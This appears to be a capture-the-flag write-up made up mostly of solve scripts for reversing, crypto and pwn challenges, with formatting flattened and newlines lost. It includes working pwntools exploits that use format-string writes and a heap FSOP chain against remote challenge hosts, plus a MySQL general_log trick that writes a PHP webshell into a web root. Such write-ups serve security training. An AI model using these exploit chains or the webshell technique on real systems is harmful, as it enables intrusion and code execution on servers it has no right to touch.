 # Check 3x3 box box_row = (row // 3) * 3 box_col = (col // 3) * 3 for i in range(box_row, box_row + 3): for j in range(box_col, box_col + 3): if board[i][j] == num: return False
 return True
def parse_input(input_string): rows = input_string.strip().split('n') board = []
 for row in rows: row = row.replace('-', '').replace('|', '').split() nums = [int(num) if num != '0' else 0 for num in row] if nums!=[]: board.append(nums)
 return board
def solve(input_string): original_board = parse_input(input_string)# 创建原始数组的副本 board_copy = [row[:] for row in original_board]

 solution = solve_sudoku(original_board) # print(board_copy) # print(solution) lists = [] for i in range(9): for j in range(9): if board_copy[i][j] == 0: lists.append(str(solution[i][j])) if j != 8: lists.append('d') lists.extend('saaaaaaaa') # print(f"索引为 ({i}, {j}) 的位置，填入数字 {solution[i][j]}") return lists
tn = telnetlib.Telnet('47.108.165.60',36697)
welcome_msg = tn.read_until(b"Please input")print(welcome_msg.decode("utf-8"))
# 发送返回值到服务器tn.write("1".encode("utf-8") + b"n")
msg = tn.read_until(b"hard(7)")print(msg.decode("utf-8"))
tn.write("5".encode("utf-8") + b"n")
msg = ''for i in range(15): response = tn.read_until(b"n") # print((response)) response = response.replace(b'x1b[7;32m',b'').replace(b'x1b[0m',b'').replace(b'x1b[1;32m',b'').replace(b'x1b[Hx1b[2J',b'') msg += response.decode().strip('> 5')tn.write(str(solve(msg)).encode("utf-8") + b"n")tn.interact()
```



```
import librosaimport soundfile as sfimport numpy as np
audio1, sr1 = librosa.load('2.wav', sr=None)audio2, sr2 = librosa.load('3.wav', sr=None)
result = 2*audio1-audio2sf.write('result.wav', result, sr1)
```



```
.text:00413CFA jmp short loc_413D19.text:00413CFA ; ---------------------------------------------------------------------------.text:00413D19 loc_413D19: ; CODE XREF: .text:00413CFA↑j.text:00413D19 push ecx.text:00413D1A nop.text:00413D1B call ds:__imp_exit
```



```
import stringimport osimport time
table = string.ascii_letters+string.digits+'!-{}'# table = string.printable# 'SYC{Y3S-yE5-y0u-S0Ve-Th3-C9P!!!}'theflag = ''while len(theflag) < 32: for ch in table: flag = (theflag+ch).ljust(32, '#') exitcode = os.system(f"echo {flag} | ez_cpp3.exe 1>&0") if exitcode >= len(theflag) + 1: theflag += ch print(theflag, exitcode) break else: print('not found') time.sleep(0.1)
```



```
m = ['#', ' ', '2', '$', '3', '@', '5']
for level in range(6): print('level', level) for y in range(10): line = '' for x in range(10): n = ida_bytes.get_dword(0x140005040+(level*100+y*10+x)*4) line += m[n] print(line)
```



```
level 0 跳 1-?-0## ######### #### #### # #### # ####### # *衔接1 wddwwdddddD## # ####### *衔接1 ##4# ########$#########*###### w
level 5 可以跳回 0-9-3###*######### ######### ######### ######### ######## ######## #######* ####### ddwwdwwwwwW####################
level 1########### ###### ## *衔接2 dwwwdddsdddddD# ########* ##################* ###################################
level 3 可以跳到5-7-0##*####### sssssssssS## ######### # ###### ## ##### ######## ######## ## ##### # ###### #########*#######
level 2 可以跳到4-0-9*######### wwW #########*## # ### ## # # # ### #### ##### ### ###### ## #### # ## ##### ### ############
level 4 可以跳3-0-2######## * 从2过来 ######## #* # assaaaaaaaaA######################################################################

00000000000111111111111112224444444444443333333333555555555550wddwwdddddDdwwwdddsdddddDwwWassaaaaaaaaAsssssssssSddwwdwwwwwWw
```



```
import ctypesfrom Crypto.Cipher import ARC4from hashlib import md5
libc = ctypes.CDLL("ucrtbase.dll")libc.srand.argtypes = [ctypes.c_uint]libc.rand.restype = ctypes.c_int
srand = libc.srandrand = libc.rand
srand(0x94307F97)seed_list = []for i in range(361): seed_list.append(rand())

def enc(buf, size, seed): srand(seed) keysize = int(rand()*1.0/32767.0 * 256.0) table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789x00' pwd = '' for i in range(keysize): idx = int(rand()*1.0 / 32767.0 * 63.0) pwd += table[idx]
 cipher = ARC4.ARC4Cipher(pwd.encode()) xorstream = b'x00'*size xorstream = cipher.encrypt(xorstream) outbuf = bytearray(buf) for i in range(size): outbuf[i] ^= xorstream[i] return bytes(outbuf)

foods = []for i in range(361): srand(seed_list[i]) while 1: y = rand() % 20 x = rand() % 20 if not (x == 0 or x == 19 or y == 0 or y == 19): # print(i, y, x) foods.append((y, x)) break

tmp = 0x92
data = b'x02'for i in range(2): data += bytes([data[-1] ^ 0xBE])# print(data.hex())
flag_data = data[:]eat_count = 361 # 初始长度就是3, 但是要求吃361个 ???for i in range(eat_count): y, x = foods[i] pos = y << 8 | x data = enc(data, 3+i, pos) # print(data.hex())
 _tmp = tmp # print(hex(tmp-1), hex(data[0]-1)) tmp = ((tmp-1) ^ (data[0]-1)) & 0xFF flag_data = data[:] data = data[::-1] data += bytes([_tmp]) # print(hex(tmp))
s = flag_data.ljust(361, b'x00').hex().encode()print('flag_data', len(flag_data))print('SYC{'+md5(s[:722]).hexdigest()+'}')
```



```
0129FE14 53 59 43 7B 54 68 31 73 5F 69 73 5F 40 5F 45 61 SYC{Th1s_is_@_Ea 0129FE24 73 59 5F 33 6E 63 72 79 70 74 4F 21 21 21 21 7D sY_3ncryptO!!!!}
```



```
from claripy import *from libnum import *

tmp_flag = [BVS(f'flag{i}', 8) for i in range(30)]# x_flag = b'111111111122222222223333333333'# tmp_flag = [BVV(x_flag[i], 8) for i in range(30)]flag = Concat(*tmp_flag)unk = 9

def enc1(): global unk unk += 1 if unk & 1 == 0: for i in range(30): tmp_flag[i] = (unk+tmp_flag[i]) ^ 0x17

def enc2(): global unk unk += 1 tmp_flag[0] += 2 tmp_flag[1] -= 28 tmp_flag[2] ^= 0x47 tmp_flag[3] += tmp_flag[4] tmp_flag[5] += 73 tmp_flag[6] += 12 tmp_flag[7] -= tmp_flag[8] tmp_flag[8] ^= 0x5A tmp_flag[9] ^= 0x22 tmp_flag[10] += 20 tmp_flag[12] -= 84 tmp_flag[13] ^= 4 tmp_flag[14] ^= 0x1C tmp_flag[17] -= 1 tmp_flag[27] ^= 0x11 tmp_flag[28] ^= 3

def enc3(): global unk if unk % 3 == 2: v13 = 0 v11 = 29 while v13 < 15: tmp_flag[v13], tmp_flag[v11] = tmp_flag[v11], tmp_flag[v13] v13 += 1 v11 -= 1 unk += 1

solve = Solver()for i in range(4): enc1() enc2() enc3()
print(hex(unk))
enc_flag = bytes.fromhex( '4D635D344309A2770ABFC9B3E96F797D7BE899904308BB990E2ED47B27B7')
for i in range(30): solve.add(enc_flag[i] == tmp_flag[i])

for k in solve.eval(flag, 2): print(n2s(k))
# b'SYC{I_h0pE_you_cAn_FInd_d4eam}'
```



```
unsigned int fin[36] = { 0x0003B148, 0x000D2CAE, 0x0003A1FB, 0x00044F40, 0x000472DE, 0x0000CCC0, 0x00001888, 0x00003B80, 0x000702F7, 0x000C745C, 0x000658E0, 0x000858D4, 0x0000D5BD, 0x00004860, 0x0014F410, 0x0002CB9F, 0x000321DB, 0x0014D534, 0x00025DA0, 0x0006898C, 0x00123D56, 0x00058E4D, 0x00050CF8, 0x00005D64, 0x000978BA, 0x0008F290, 0x0003B568, 0x00054696, 0x00094C12, 0x0001021F, 0x000DBACB, 0x00049680, 0x0002FABD, 0x000F2B58, 0x0012D23C, 0x0014AED3 }; unsigned long mul[36] = { 0x0000000000000D21, 0x000000000000009D, 0x000000000000094B, 0x00000000000003C9, 0x0000000000000C3F, 0x00000000000017E9, 0x000000000000130E, 0x0000000000000088,0x0000000000000486, 0x000000000000202F, 0x0000000000002230, 0x00000000000024B4, 0x00000000000008B1, 0x0000000000000A9F, 0x0000000000001AD2, 0x00000000000023EB, 0x0000000000000C7E, 0x000000000000042B, 0x00000000000005BF, 0x000000000000113C,0x0000000000000449, 0x0000000000001751, 0x0000000000000ACE, 0x0000000000001894, 0x000000000000208A, 0x0000000000000E82, 0x00000000000006BD, 0x0000000000000CEE,0x0000000000002386, 0x00000000000013D4, 0x0000000000000111, 0x0000000000000D1C, 0x000000000000238E, 0x0000000000001759, 0x000000000000012B, 0x000000000000214D }; unsigned char flag[40] = { 0 }; unsigned long* a = &mul[18]; for (int i = 0; i < 36; i += 6) { flag[i] = fin[i] / (*(a - 18)); flag[i + 1] = fin[i + 1] / (*(a - 12)); flag[i + 2] = fin[i + 2] / (*(a - 6)); flag[i + 3] = fin[i + 3] / (*(a)); flag[i + 4] = fin[i + 4] / (*(a + 6)); flag[i + 5] = fin[i + 5] / (*(a + 12)); a++; } int j = 0; for (int i = 35; i >= 0; --i) { flag[i] ^= flag[j++]; flag[i] = ((flag[i] >> 4) | (flag[i] << 4)) & 0xff; } printf("%s", flag);
```



```
p.recvuntil(' game!n')p.send(b'a'*28+p32(0))rand_list=[1804289348,846930915,1681692750,1714636888,1957747830,424238300,719885423,1649760457,596516622,1189641450,1025202335,1350490000,783368663,1102520032,2044897736,1967513955,1365180505,1540383463,304089201,1303455709,35005248]for i in range(len(rand_list)):p.recvuntil('input:')p.sendline(str(rand_list[i]))
```



```
from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
procname = './pwn'libcname = './libc.so.6'
# io = process(procname, stdin=PTY)io = remote('47.108.165.60', 47744)elf = ELF(procname)libc = ELF(libcname)
n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
sa(b' game!n', b'a' * 28 + p32(0))rand_list=[1804289348,846930915,1681692750,1714636888,1957747830,424238300,719885423,1649760457,596516622,1189641450,1025202335,1350490000,783368663,1102520032,2044897736,1967513955,1365180505,1540383463,304089201,1303455709,35005248]
for i in range(len(rand_list)): sla(b'input:', str(rand_list[i]).encode())
sa(b'input your data ;)n', b'%pAAAA ')heap = int(ru(b'AAAA'), 16)success(f'leak heap: {hex(heap)}')
sa(b'input your data ;)n', b'%11$llxAAAA ')libc.address = int(ru(b'AAAA'), 16) - libc.sym.__libc_start_main + 128 - 0x50success(f'leak libc.address: {hex(libc.address)}')
printf_arginfo = libc.address + 0x21A8B0success(f'printf_arginfo: {hex(printf_arginfo)}')printf_functable = libc.address + 0x21b9c8success(f'printf_functable: {hex(printf_functable)}')
sa(b'input your data ;)n', b'%15$pAAAA ')stack = int(ru(b'AAAA'), 16)success(f'leak stack: {hex(stack)}')
ra = stack - 0x110
sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{printf_arginfo&0xffff}c%45$hn '.encode())
sa(b'input your data ;)n', f'%{(ra + 2)&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{(printf_arginfo >> 16) & 0xff}c%45$hhn '.encode())
sa(b'input your data ;)n', f'%{ra&0xffff}c%15$hn '.encode())sa(b'input your data ;)n', f'%{heap&0xffff}c%11$hn '.encode())
sa(b'input your data ;)n', f'%{(printf_arginfo + 2) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 16)&0xffff}c%11$hn '.encode())
sa(b'input your data ;)n', f'%{(printf_arginfo + 4) & 0xff}c%45$hhn '.encode())sa(b'input your data ;)n', f'%{(heap >> 32)&0xffff}c%11$hn '.encode())
sa(b'input your data ;)n', f'%{printf_functable & 0xffff}c%45$hn '.encode())sa(b'input your data ;)n', b'A%11$hhn ')
import subprocessdef get_one_gadgets(): one_gadgets = [int(i) + libc.address for i in subprocess.check_output(['one_gadget', '-l', '1', '--raw', libcname]).decode().split(' ')] debug(f'search one gadgets from {libcname}: {[hex(i) for i in one_gadgets]}') return one_gadgets
import syssa(b'input your data ;)n', b'%A'.ljust(8, b' ') + p64(get_one_gadgets()[int(sys.argv[1])]) * 0x41)
ia()
```



```
from pwn import *context(os='linux', arch='amd64')#, log_level='debug')
procname = './pwn'libcname = './libc.so.6'
# io = process(procname, stdin=PTY)io = remote('47.108.165.60', 22692)elf = ELF(procname)libc = ELF(libcname)
n2b = lambda x : str(x).encode()rv = lambda x : io.recv(x)ru = lambda s : io.recvuntil(s, drop=True)sd = lambda s : io.send(s)sl = lambda s : io.sendline(s)sn = lambda s : sl(n2b(n))sa = lambda p, s : io.sendafter(p, s)sla = lambda p, s : io.sendlineafter(p, s)sna = lambda p, n : sla(p, n2b(n))ia = lambda : io.interactive()rop = lambda r : flat([p64(x) for x in r])
def leakaddr(pre = None, suf = None, bit = 64, keepsuf = True, off = 0): u = {64: u64, 32: u32} num = 6 if bit == 64 else 4 if pre is not None: ru(pre) if suf is not None: r = ru(suf) if keepsuf: r += suf r = r[-num:] else: r = rv(num) return u[bit](r.ljust(bit//8, b' ')) - off
prompt = b':'prompt_menu = b'>> n'prompt_idx = prompt
op = lambda x : sla(prompt_menu, n2b(x))snap = lambda n : sna(prompt, n)sidx = lambda x : sla(prompt_idx, n2b(x))sap = lambda s : sa(prompt, s)slap = lambda s : sla(prompt, s)
def add(size, content): op(1) snap(size) sap(content)
def edit(idx, content): op(4) sidx(idx) sap(content)
def show(idx): op(3) sidx(idx)
def free(idx): op(2) sidx(idx)
add(0x90, b' ')add(0x90, b'1')free(0)add(0x90, b' ')show(0)heap = leakaddr(pre=b'context:n') << 12success(f'leak heap: {hex(heap)}')free(0)free(1)
fake_chunk = heap + 0x3e0
add(0xf10, rop([0, 0x1EA1, fake_chunk, fake_chunk]))add(0xef0, b'1')add(0x88, b'2')add(0xef0, b'3')add(0xa0, b'4')
edit(2, b'a' * 0x80 + p64(0x1EA0))# pause()free(3)
show(0)libc.address = leakaddr(suf=b'x7f', off=0x219CE0)success(f'leak libc.address: {hex(libc.address)}')
pause()
add(0x300, b'3')add(0x300, b'5')
free(5)free(3)
ptr = libc.sym._IO_list_allfd = (fake_chunk >> 12) ^ ptredit(0, rop([0, 0x310, fd]))
fake_io_addr = fake_chunk + 0x10frame_addr = fake_io_addr + 0x100
frame = SigreturnFrame()frame.rip = libc.sym.mprotectframe.rdi = heapframe.rsi = 0x10000frame.rdx = 7frame.rsp = fake_io_addr + 0xf0
code_addr = frame_addr + len(bytes(frame))
fake_io_file = rop([ u64(b'/flag'.ljust(8, b' ')), 0, # 0x00 1, libc.sym.setcontext + 0x3d, # 0x10 1, frame_addr, # 0x20 0, 0, # 0x30 0, 0, # 0x40 0, 0, # 0x50 0, 0, # 0x60 0, 0, # 0x70 0, heap, # 0x80 0, 0, # 0x90 fake_io_addr + 8, 0, # 0xa0 0, 0, # 0xb0 1, 0, # 0xc0 0, libc.sym._IO_wfile_jumps + 0x30, # 0xd0 0, fake_io_addr, # 0xe0 code_addr, 0, # 0xf0])
code = shellcraft.open(fake_io_addr, 0) + shellcraft.sendfile(2, 3, 0, 0x50)
payload = fake_io_file + bytes(frame) + asm(code) + b' ' * 10
add(0x300, payload)
add(0x300, p64(fake_io_addr))
ia()
```



```
import gmpy2
from Crypto.Util.number import long_to_bytes

#求出data1，data2
data3=1.42870767357206600351348423521722279489230609801270854618388981989800006431663026299563973511233193052826781891445323183272867949279044062899046090636843802841647378505716932999588

c = continued_fraction(data3)
print(c)

alist = c.convergents()
print(alist)

for i in alist:
 a = str(i).split('/')
 if len(a) > 1 and gcd(int(a[0]), int(a[1])) == 1 and is_prime(int(a[0])) and is_prime(int(a[1])) and int(
 a[0]).bit_length() == 256 and int(a[1]).bit_length() == 256:
 print(a)
 break
#['97093002077798295469816641595207740909547364338742117628537014186754830773717', '67958620138887907577348085925738704755742144710390414146201367031822084270769']

#解密leak得到p-q
data1=97093002077798295469816641595207740909547364338742117628537014186754830773717
data2=67958620138887907577348085925738704755742144710390414146201367031822084270769
leak=1788304673303043190942544050868817075702755835824147546758319150900404422381464556691646064734057970741082481134856415792519944511689269134494804602878628
e=data1
n=data1*data2
phi = (data1-1) * (data2-1)
d = gmpy2.invert(e,phi)
p_q = gmpy2.powmod(leak,d,n)
print(p_q)

#求解p，q
p_q=57684649402353527014234479338961992571416462151551812296301705975419997474236
n=2793178738709511429126579729911044441751735205348276931463015018726535495726108249975831474632698367036712812378242422538856745788208640706670735195762517
e = 65537
c = 1046004343125860480395943301139616023280829254329678654725863063418699889673392326217271296276757045957276728032702540618505554297509654550216963442542837
var("p,q")
eq1= p-q ==p_q
eq2= p*q ==n
sol = solve([eq1,eq2], p, q)
print(sol)

p = 89050782851818876669770322556796705712770640993210984822169118425068336611139
q = 31366133449465349655535843217834713141354178841659172525867412449648339136903
phi = (q-1) * (p-1)
d = gmpy2.invert(e,phi)
m = gmpy2.powmod(c,d,n)-data2
print(m)
print(long_to_bytes(m))
```



```
$$P=m^p pmod {p*q*r} \
Q=m^q pmod {p*q*r} \
R=m^R pmod {p*q*r} \
```



```
费马小定理：\
m^p=m pmod p \
P=m+k1*p+k2*pqr=m+k3*p \
Q,R同理 \qquadtext{(1)}$$
```



```
$$P=m+k3*p\
Q=m+k4*q\
R=m+k5*r\
```



```
k_3p=P-M,k_4q=Q-m,k_5r=R-m\
```



```
P*Q*R-m^3-m*(P-m)*(Q-m)-m^2*((P-m)+(Q-m))-(R-m)*m^2-m*((P-m)+(Q-m))*(R-m)equiv 0 pmod nqquadtext{(2)}$$
```



```
from Crypto.Util.number import *
import gmpy2 
#coppersmith
clown = 128259792862716016839189459678072057136816726330154776961595353705839428880480571473066446384217522987161777524953373380960754160008765782711874445778198828395697797884436326877471408867745183652189648661444125231444711655242478825995283559948683891100547458186394738621410655721556196774451473359271887941209
trick = 13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464455212126838976863742628716168391373019631629866746550551576576

n = clown
p = trick

pbits = 512
kbits = 220
p=p>>kbits<<kbits
PR.<x> = PolynomialRing(Zmod(n))
f = x + p
x0 = f.small_roots(X=2^kbits, beta=0.4)
p=p+int(x0[0])
print(p)

#构建关于m的多项式求解即可，m即为r
n = 924936528644761261915490226270682878749572154775391302241867565751616615723850084742168094776229761548826664906020127037598880909798055174894996273670320006942669796769794827782190025101253693980249267932225152093301291975335342891074711919668098647971235568200490825183676601392038486178409517985098598981313504275523679007669267428032655295176395420598988902864122270470643591017567271923728446920345242491655440745259071163984046349191793076143578695363467259
P = 569152976869063146023072907832518894975041333927991456910198999345700391220835009080679006115013808845384796762879536272124713177039235766835540634080670611913370463720348843789609330086898067623866793724806787825941048552075917807777474750280276411568158631295041513060119750713892787573668959642318994049493233526305607509996778047209856407800405714104373282610244944206314614906974275396096712817649817035559000245832673082730407216670764400076473183825246052
Q = 600870923560313304359037202752076267074889238956345564584928427345594724253036201151726541881494799597966727749590645445697106549304014936202421316051605075583257261728145977582815350958084624689934980044727977015857381612608005101395808233778123605070134652480191762937123526142746130586645592869974342105683948971928881939489687280641660044194168473162316423173595720804934988042177232172212359550196783303829050288001473419477265817928976860640234279193511499
R = 502270534450244040624190876542726461324819207575774341876202226485302007962848054723546499916482657212105671666772860609835378197021454344356764800459114299720311023006792483917490176845781998844884874288253284234081278890537021944687301051482181456494678641606747907823086751080399593576505166871905600539035162902145778102290387464751040045505938896117306913887015838631862800918222056118527252590990688099219298296427609455224159445193596547855684004680284030

PR.<m> = PolynomialRing(Zmod(n))
f = P*Q*R-m*m*m-m*(P-m)*(Q-m)-m*m*((P-m)+(Q-m))-(R-m)*m*m-m*((P-m)+(Q-m))*(R-m)
f = f.monic()
m = f.small_roots(X=2^280, beta=0.4)
print(m)

r=m

#直接解密即可
r=105960538296223496551922954965164644267919720177702173352061963871195469608683
p=13053422630763887754872929794631414002868675984142851995620494432706465523574529389771830464531559991042565319610790540616696456104018890243275374098291711
c = 10585127810518527980133202456076703601165893288538440737356392760427497657052118442676827132296111066880565679230142991175837099225733564144475217546829625689104025101922826124473967963669155549692317699759445354198622516852708572517609971149808872997711252940293211572610905564225770385218093601905012939143618159265562064340937330846997881816650140361013457891488134685547458725678949
e = 65537
n=p*r
phi = (r-1) * (p-1)
d = gmpy2.invert(e,phi)
m = gmpy2.powmod(c,d,n)
print(m)
print(long_to_bytes(m))
```



```
from random import randintimport gmpy2 as gpfrom Crypto.Util.number import *from Crypto.Cipher import AESfrom hashlib import md5from binascii import *
from tqdm import tqdm
a = 12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215b = 10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673m = 9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817seq = [1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064, 12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860, 13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339, 8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005, 5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052, 9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050, 6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410, 3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626, 2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738, 10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967]ct = 0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81
n = 2023
def seqsum(i): ans = 0 for j in range(len(seq)): ans += gp.powmod(i, j, m) * seq[j] return ans

def home1work(n): if n == 1: return 1 elif n == 2: return 1 else: previous, current = 1, 1 for i in tqdm(range(3, n + 1)): previous, current = current, (a * current + b * previous + seqsum(i)) % m return current
ans = home1work(n)
k = unhexlify(md5(str(ans).encode()).hexdigest())aes = AES.new(k, AES.MODE_ECB)#data = flag + (16 - len(flag) % 16) * b"x00"data=long_to_bytes(ct)ct = aes.decrypt(data)print(ct)#b"c7ceedc7197a0d350025fff478f667293ebbaa6b'x00x00x00x00x00x00x00"
```



```
set global general_log='on'
set global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1686532770.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1686532770.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/8-1686532773.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/6-1686532774.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/0-1686532775.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1686532776.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1686532777.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/4-1686532777.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/7-1686532778.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/2-1686532779.png)